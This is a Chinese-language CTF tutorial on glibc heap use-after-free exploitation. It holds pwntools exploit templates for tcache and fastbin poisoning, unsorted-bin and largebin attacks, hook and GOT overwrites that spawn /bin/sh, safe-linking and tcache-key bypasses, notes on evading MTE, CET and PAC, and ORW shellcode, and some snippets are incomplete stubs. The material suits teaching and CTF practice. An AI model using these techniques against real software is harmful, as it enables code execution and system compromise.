# UAF (Use After Free)

## 原理

程序释放堆块后，仍持有指向该堆块的指针（悬垂指针），攻击者通过该指针读取/修改已释放的堆块，破坏堆元数据或泄露信息。

## 攻击链

### 1. 漏洞识别

```c
// 危险代码
char *ptr = malloc(0x20);
free(ptr);
// ptr 仍可用
ptr[0] = 'A';  // UAF 写
printf("%s", ptr);  // UAF 读
```

### 2. 基础 UAF

```python
from pwn import *

p = process('./pwn')

# 1. 分配
malloc(0x20)  # idx 0
# 2. 释放
free(0)
# 3. UAF 读（泄露）
fd = u64(read(0, 8))  # 读取 fd 指针
# 4. UAF 写（修改 fd）
edit(0, p64(target_addr))
# 5. 再次分配，返回 target_addr
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 target_addr
```

### 3. UAF 泄露 libc

```python
# 1. 分配大 chunk（大于 tcache）
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 读取 fd/bk（指向 main_arena）
fd = u64(read(0, 8))
libc_base = fd - (libc.symbols['main_arena'] + 96)
```

### 4. UAF 泄露堆地址

```python
# 1. 分配两个 chunk
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1
# 2. 释放 idx 0，进入 tcache
free(0)
# 3. UAF 读取 fd（指向 NULL 或下一个 tcache 块）
# 如果 tcache 为空，fd = 0
# 如果有其他块，fd 指向堆地址

# 释放 idx 1
free(1)
# 现在 tcache: idx1 -> idx0
# UAF 读取 idx 1 的 fd
fd = u64(read(1, 8))
heap_base = fd & ~0xfff
```

### 5. UAF + Tcache Poisoning

```python
# glibc 2.26+
# 1. 分配
malloc(0x20)  # idx 0
# 2. 释放
free(0)
# 3. UAF 修改 fd
edit(0, p64(target_addr))
# 4. 分配两次
malloc(0x20)  # idx 1，返回原 idx 0
malloc(0x20)  # idx 2，返回 target_addr
```

### 6. UAF + Fastbin Attack

```python
# glibc < 2.26 或 tcache 满后
# 1. 分配 7 个 + 1 个
for i in range(7):
    malloc(0x70)  # idx 0-6
malloc(0x70)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 fastbin
free(7)
# 4. UAF 修改 fd
edit(7, p64(target_addr))
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 6. 分配得到 target_addr
malloc(0x70)  # 返回 fastbin 中的块
malloc(0x70)  # 返回 target_addr
```

### 7. UAF + Unsorted Bin Attack

```python
# 1. 分配大 chunk
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1
# 2. 释放 idx 0
free(0)
# 3. UAF 修改 bk
edit(0, p64(0) + p64(target_addr - 0x10))
# 4. 分配触发
malloc(0x400)
# target_addr 处被写入 main_arena 地址
```

### 8. UAF + Largebin Attack

```python
# 1. 分配大 chunk
malloc(0x420)  # idx 0
malloc(0x20)   # idx 1
malloc(0x410)  # idx 2
malloc(0x20)   # idx 3
# 2. 释放 idx 0
free(0)
# 3. 分配大 chunk，触发 idx 0 进入 largebin
malloc(0x430)  # idx 4
# 4. 释放 idx 2
free(2)
# 5. UAF 修改 idx 0 的 bk_nextsize
edit(0, ...)  # 修改 bk_nextsize = target_addr - 0x20
# 6. 分配触发
malloc(0x430)
# target_addr 处被写入堆地址
```

## 利用场景

### 1. 覆盖 __malloc_hook

```python
# glibc < 2.34
# 通过 UAF + tcache poisoning
malloc(0x20)  # idx 0
free(0)
edit(0, p64(malloc_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 malloc_hook
edit(2, p64(one_gadget))
# 触发 malloc
p.sendline(b'1')
```

### 2. 覆盖 __free_hook

```python
# glibc < 2.34
malloc(0x20)  # idx 0
free(0)
edit(0, p64(free_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 free_hook
edit(2, p64(system))
# 写入 /bin/sh
edit(0, b'/bin/sh\x00')
free(0)  # 触发 system("/bin/sh")
```

### 3. 覆盖 GOT 表

```python
# Partial RELRO
malloc(0x20)  # idx 0
free(0)
edit(0, p64(elf.got['free']))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 GOT 表
edit(2, p64(system))
edit(0, b'/bin/sh\x00')
free(0)
```

### 4. 覆盖栈上的返回地址

```python
# 1. 泄露栈地址（通过 _environ）
# 2. UAF + tcache poisoning 分配到栈上
# 3. 覆盖返回地址
```

### 5. House of Spirit

```python
# 在栈/BSS 上伪造 chunk
# 1. 在目标地址伪造 chunk 元数据
# 2. free 该地址
# 3. malloc 返回该地址
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks UAF 利用

```python
# glibc 2.34+ 移除 __malloc_hook/__free_hook
# UAF 需要转向新的利用目标

from pwn import *

context.arch = 'amd64'

def uaf_exploit_no_hooks():
    """glibc 2.34+ UAF 利用模板"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size, idx=None):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # === UAF 核心利用路径 (glibc 2.34+) ===
    
    # 路径 1：UAF -> tcache poisoning -> stdout 劫持 -> 泄露 -> RCE
    malloc(0x400)  # idx 0
    malloc(0x20)   # idx 1 (guard)
    free(0)
    show(0)
    fd = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = fd - (libc.symbols['main_arena'] + 96)
    log.success(f"libc: {hex(libc_base)}")
    
    # UAF 修改 fd 进行 tcache poisoning
    stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
    # 构造加密的 fd (safe-linking)
    chunk0_addr = heap_addr + offset_to_idx0
    encrypted = (chunk0_addr >> 12) ^ stdout_addr
    edit(0, p64(encrypted))
    malloc(0x400)  # 返回原 chunk
    malloc(0x400)  # 返回 stdout_addr
    # 覆盖 _IO_write_base 实现泄露
    
    # 路径 2：UAF -> tcache/fastbin -> _IO_list_all -> fake IO_FILE
    # 构造 fake _IO_FILE_plus
    # 触发 _IO_flush_all_lockp
    
    # 路径 3：UAF -> tcache -> exit_funcs -> RCE
    # 覆盖 __exit_funcs
    
    p.interactive()
```

### 2. safe-linking 绕过 (glibc 2.32+)

```python
# UAF 时需要处理 safe-linking 加密

from pwn import *

context.arch = 'amd64'

def uaf_safe_linking_bypass():
    """UAF + safe-linking 完整绕过"""
    p = process('./pwn')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # Step 1: 泄露堆地址
    # 分配两个 chunk，释放后利用 UAF 读取加密 fd
    malloc(0x20)  # idx 0
    malloc(0x20)  # idx 1
    free(0)
    show(0)
    enc_fd = u64(p.recv(6).ljust(8, b'\x00'))
    # tcache 为空时 next = NULL，enc_fd = (chunk0 >> 12) ^ 0
    chunk0_addr = enc_fd << 12
    heap_base = chunk0_addr & ~0xfff
    log.success(f"heap: {hex(heap_base)}")
    
    # Step 2: 计算加密 fd
    target = 0x404000  # 目标写入地址
    encrypted = (chunk0_addr >> 12) ^ target
    
    # Step 3: UAF 写入加密 fd
    edit(0, p64(encrypted))
    malloc(0x20)  # idx 2 -> 返回原 chunk0
    malloc(0x20)  # idx 3 -> 返回 target
    
    # 现在 idx 3 指向 target，可以读写
```

### 3. tcache key 加固绕过

```python
# UAF 释放后 key 检测的绕过

from pwn import *

context.arch = 'amd64'

def uaf_tcache_key_bypass():
    """UAF 中绕过 tcache key 的多种方法"""
    
    # === 方法 1：UAF 覆盖 key 为 0 ===
    # 释放后通过 UAF 修改 key 字段
    # key 被设置为 tcache_perthread_struct 地址
    # 将其覆盖为 0，使 double free 检查失效
    edit(idx, p64(target_addr) + p64(0))  # fd + key
    # 此时再 free 不会检测到 double free
    
    # === 方法 2：利用不同的 tcache bin ===
    # 修改 chunk size，使其属于不同的 tcache bin
    # 每个 bin 的 key 检测是独立的
    # glibc 2.34+ 对此也有检查（size 一致性检查）
    
    # === 方法 3：fastbin 绕过 ===
    # 填满 tcache，让 chunk 进入 fastbin
    # fastbin 无 key 检测
    for i in range(7):
        malloc(0x70)
    malloc(0x70)  # idx 7
    for i in range(7):
        free(i)
    free(7)  # 进入 fastbin，无 key 检测
    
    # === 方法 4：UAF + unsorted bin ===
    # 大 chunk 释放到 unsorted bin，无 key 检测
    malloc(0x400)
    free(0)
    # UAF 修改 fd/bk 进行 unsorted bin attack
    
    pass
```

### 4. House of Apple 系列 (UAF 部分)

```python
# UAF 作为 House of Apple 2/3 的入口

from pwn import *

context.arch = 'amd64'

def uaf_house_of_apple2():
    """
    UAF + House of Apple 2 完整利用：
    1. UAF 泄露 libc（unsorted bin fd/bk）
    2. UAF 泄露堆地址（tcache fd）
    3. tcache/fastbin poisoning 分配到 _IO_list_all 附近
    4. 构造 fake _IO_FILE_plus
       - _flags: 设置适当标志
       - _wide_data: 指向伪造的 _IO_wide_data
       - vtable: 指向合法的 _IO_wfile_jumps
       - _wide_data->_wide_vtable: 指向伪造的函数指针
    5. 触发 _IO_flush_all_lockp
    6. _IO_wfile_overflow -> _IO_wdoallocbuf -> 执行
    """
    pass
```

### 5. House of Cat (UAF 部分)

```python
# UAF 在 House of Cat 中的作用

from pwn import *

context.arch = 'amd64'

def uaf_house_of_cat():
    """
    UAF + House of Cat 利用链：
    1. UAF 获取信息泄露
    2. tcache poisoning -> largebin attack
    3. largebin attack 修改 _IO_list_all
    4. 构造 fake IO_FILE
    5. 触发 _IO_flush_all_lockp
    6. 通过 _IO_wfile_overflow -> _IO_wdoallocbuf 执行
    
    2024 年 CTF 中的典型利用流程：
    - 漏洞类型：UAF + 堆溢出
    - glibc 版本：2.35+
    - 保护：Full RELRO + NX + Canary
    - 最终利用：ORW 读取 flag
    """
    pass
```

### 6. 硬件级防护对 UAF 的影响

```python
# Intel CET / ARM PAC+BTI / ARM MTE 对 UAF 的影响

from pwn import *

def mte_uaf_impact():
    """MTE 下的 UAF 利用"""
    # MTE 给堆块分配 tag
    # UAF 读写时检查 tag 是否匹配
    # free 后 tag 被回收，再访问触发异常
    
    # 绕过方法：
    # 1. Use-Before-Free：在 free 之前完成所有操作
    # 2. Tag reuse：等待 tag 被重新分配（约 1/16 概率）
    # 3. 侧信道：通过 timing 泄露 tag 值
    # 4. 混合利用：MTE 的 sync/async 模式有不同安全性
    #    - sync MTE：立即触发异常（更安全）
    #    - async MTE：延迟报告（更容易利用）
    
    # glibc 2.36+ 启用 sync MTE 时：
    # free 立即清除 tag，UAF 后无法访问
    # 需要更精确的时序控制
    pass

def cet_uaf_impact():
    """CET 下的 UAF 利用"""
    # 影子栈保护返回地址
    # UAF 覆盖返回地址后，ret 时影子栈校验失败
    
    # 绕过方法：
    # 1. 覆盖非返回地址的数据（函数指针、全局变量）
    # 2. 利用 longjmp 绕过影子栈
    # 3. 利用 setcontext/sigreturn 修改控制流
    pass

def pac_uaf_impact():
    """PAC 下的 UAF 利用"""
    # ARM PAC 保护返回地址和部分数据指针
    # UAF 修改指针后，PAC 校验失败
    
    # 绕过方法：
    # 1. 利用未受 PAC 保护的指针（全局变量、堆数据）
    # 2. 部分覆盖绕过签名区域
    # 3. 从内存中读取已签名的合法指针并复用
    pass
```

### 7. 沙箱环境 UAF 利用

```python
# seccomp 限制下的 UAF 利用

from pwn import *

context.arch = 'amd64'

def uaf_orw_exploit():
    """UAF + ORW 完整利用"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # Step 1: 信息泄露
    malloc(0x400)  # idx 0
    malloc(0x20)   # idx 1
    free(0)
    show(0)
    fd = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = fd - (libc.symbols['main_arena'] + 96)
    
    # Step 2: UAF + tcache poisoning
    # 覆盖 _IO_2_1_stdout_ 实现多次泄露
    # 最终获得堆地址和栈地址
    
    # Step 3: 覆盖 exit_funcs 或构造 ORW ROP
    # 方案 A：exit_funcs + ORW ROP
    # 方案 B：IO_FILE + ORW shellcode
    
    # 方案 B 详细步骤：
    # 1. tcache poisoning 分配到 _IO_list_all
    # 2. 覆盖 _IO_list_all 指向 fake IO_FILE
    # 3. fake IO_FILE 中嵌入 ORW shellcode
    # 4. 触发 _IO_flush_all_lockp -> 执行 shellcode
    
    # ORW shellcode
    orw_sc = asm(f'''
        /* open("flag", O_RDONLY) */
        lea rdi, [rip + flag_str]
        xor esi, esi
        mov al, 2
        syscall
        /* read(fd, bss, 0x100) */
        mov edi, eax
        lea rsi, [rip + bss_buf]
        mov dl, 0x40
        xor eax, eax
        syscall
        /* write(1, bss, len) */
        mov edx, eax
        mov edi, 1
        mov al, 1
        syscall
        flag_str: .asciz "flag"
        bss_buf: .space 0x100
    ''')
    
    p.interactive()
```

### 8. 新型利用链 (2024-2026)

```python
# 2024-2026 年基于 UAF 的新型利用链

from pwn import *

context.arch = 'amd64'

# === House of Banana (glibc 2.34+) ===
def uaf_house_of_banana():
    """
    1. UAF 获取信息泄露
    2. tcache/fastbin poisoning
    3. 覆盖 __exit_funcs
    4. 构造 fake exit_function_list
    5. exit() 执行任意函数
    """
    pass

# === House of Emu (glibc 2.36+) ===
def uaf_house_of_emu():
    """
    1. UAF 获取信息泄露
    2. 利用新的 IO_FILE 路径
    3. 绕过 2.36+ 的新保护
    """
    pass

# === 综合利用框架 ===
class UAFExploitFramework:
    """UAF 综合利用框架 (2024+)"""
    
    def __init__(self, p, elf, libc):
        self.p = p
        self.elf = elf
        self.libc = libc
    
    def leak_libc(self):
        """通过 UAF + unsorted bin 泄露 libc"""
        pass
    
    def leak_heap(self):
        """通过 UAF + tcache 泄露堆地址"""
        pass
    
    def leak_stack(self):
        """通过 UAF + _environ 泄露栈地址"""
        pass
    
    def arbitrary_write(self, target):
        """通过 tcache poisoning 实现任意写"""
        pass
    
    def trigger_execution(self, method='exit_funcs'):
        """触发代码执行"""
        if method == 'exit_funcs':
            pass  # 覆盖 exit_funcs
        elif method == 'io_file':
            pass  # 覆盖 _IO_list_all
        elif method == 'orw':
            pass  # seccomp 环境下的 ORW
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki UAF](https://ctf-wiki.org/pwn/linux/glibc-heap/use_after_free/)
- [how2heap](https://github.com/shellphish/how2heap)
- [UAF Exploitation](https://www.ayrx.me/use-after-free-exploitation)
